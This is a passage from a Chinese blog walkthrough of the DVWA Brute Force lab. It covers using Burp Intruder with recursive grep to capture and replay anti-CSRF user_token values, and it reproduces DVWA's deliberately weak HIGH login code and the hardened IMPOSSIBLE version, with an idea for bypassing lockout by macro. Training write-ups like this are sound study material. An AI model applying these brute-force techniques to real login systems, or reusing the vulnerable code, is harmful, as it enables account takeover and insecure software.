+<p>当然，我们需要的是用户名和密码生成两份不同组合只需要修改fprintf后面的指针为p1和p2保证用户名和密码的排列不一样即可<br><img src="/dvwa-brute/dvwa-brute/24.png" alt="tcp"><br>然后我们要生成user_token于前端。<br>将payload的第三个变量也就是user_token变量设置为recursive grep<br><img src="/dvwa-brute/dvwa-brute/19.png" alt="tcp"><br>然后修改线程为1因为我们是一个人一次持一张身份证进入学校的，对吧？<br><img src="/dvwa-brute/dvwa-brute/20.png" alt="tcp"><br><img src="/dvwa-brute/dvwa-brute/21.png" alt="tcp"><br>在下面grep extract进行add然后点击fetch来拿到响应包<br><img src="/dvwa-brute/dvwa-brute/22.png" alt="tcp"><br>在相应包中找到user_token也就是我们拿到的与身份证相对应的学生证<br>并复制得到的user_token<br><img src="/dvwa-brute/dvwa-brute/19.png" alt="tcp"><br>粘贴到first request中<br><img src="/dvwa-brute/dvwa-brute/23.png" alt="tcp"><br>然后我们就可以开始愉快的爆破了。</p>
+<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>我们还是来看看代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = mysql_real_escape_string( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = mysql_real_escape_string( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysql_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span> = mysql_result( <span class="variable">$result</span>, <span class="number">0</span>, <span class="string">&quot;avatar&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">0</span>, <span class="number">3</span> ) );</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>我们看到这次需要提交user_token而系统也会检查session_token，这已经可以抵御无脑爆破了</p>
+<h2 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line">    <span class="variable">$user</span> = stripslashes( <span class="variable">$user</span> );</span><br><span class="line">    <span class="variable">$user</span> = mysql_real_escape_string( <span class="variable">$user</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = stripslashes( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = mysql_real_escape_string( <span class="variable">$pass</span> );</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values</span></span><br><span class="line">    <span class="variable">$total_failed_login</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="variable">$lockout_time</span>       = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$account_locked</span>     = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out.</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ] &gt;= <span class="variable">$total_failed_login</span> ) )  &#123;</span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration!</span></span><br><span class="line">        <span class="comment">//echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again</span></span><br><span class="line">        <span class="variable">$last_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span> = strtotime( <span class="variable">$last_login</span> );</span><br><span class="line">        <span class="variable">$timeout</span>    = strtotime( <span class="string">&quot;<span class="subst">&#123;$last_login&#125;</span> +<span class="subst">&#123;$lockout_time&#125;</span> minutes&quot;</span> );</span><br><span class="line">        <span class="variable">$timenow</span>    = strtotime( <span class="string">&quot;now&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn&#x27;t locked the account</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$timenow</span> &gt; <span class="variable">$timeout</span> )</span><br><span class="line">            <span class="variable">$account_locked</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password)</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR);</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login...</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( <span class="variable">$account_locked</span> == <span class="literal">false</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$avatar</span>       = <span class="variable">$row</span>[ <span class="string">&#x27;avatar&#x27;</span> ];</span><br><span class="line">        <span class="variable">$failed_login</span> = <span class="variable">$row</span>[ <span class="string">&#x27;failed_login&#x27;</span> ];</span><br><span class="line">        <span class="variable">$last_login</span>   = <span class="variable">$row</span>[ <span class="string">&#x27;last_login&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;<span class="subst">&#123;$user&#125;</span>&lt;/em&gt;&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$failed_login</span> &gt;= <span class="variable">$total_failed_login</span> ) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Number of login attempts: &lt;em&gt;<span class="subst">&#123;$failed_login&#125;</span>&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in <span class="subst">&#123;$lockout_time&#125;</span> minutes&lt;/em&gt;.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, <span class="variable">$user</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+<p>impossible在使用了user_token的基础上加入了锁定时间，基本堵死了爆破的道路，并且在sql注入上加入了PDO防注入机制，也彻底堵死了sql注入的可能。</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>利用burp写一份宏，修改每次的cokkie值重新登录并自动输入网站登录名和密码在进行pitchfork爆破。</p>
+
+      </div>
+      
+      
+      
+    </div>
+    
+
+    
+    
+    
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DVWA-Brute-Force"><span class="nav-number">1.</span> <span class="nav-text">DVWA Brute Force</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LOW"><span class="nav-number">1.1.</span> <span class="nav-text">LOW</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#WAY-1"><span class="nav-number">1.1.1.</span> <span class="nav-text">WAY 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAY-2"><span class="nav-number">1.1.2.</span> <span class="nav-text">WAY 2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WAY-2-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">WAY 2-1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WAY-2-2"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">WAY 2-2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WAY-2-3"><span class="nav-number">1.1.2.3.</span> <span class="nav-text">WAY 2-3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.1.3.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MEDIUM"><span class="nav-number">1.2.</span> <span class="nav-text">MEDIUM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-1"><span class="nav-number">1.2.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HIGH"><span class="nav-number">1.3.</span> <span class="nav-text">HIGH</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93-2"><span class="nav-number">1.3.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#impossible"><span class="nav-number">1.4.</span> <span class="nav-text">impossible</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.4.1.</span> <span class="nav-text">思路</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ziyuexi</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">1</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ziyuexi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
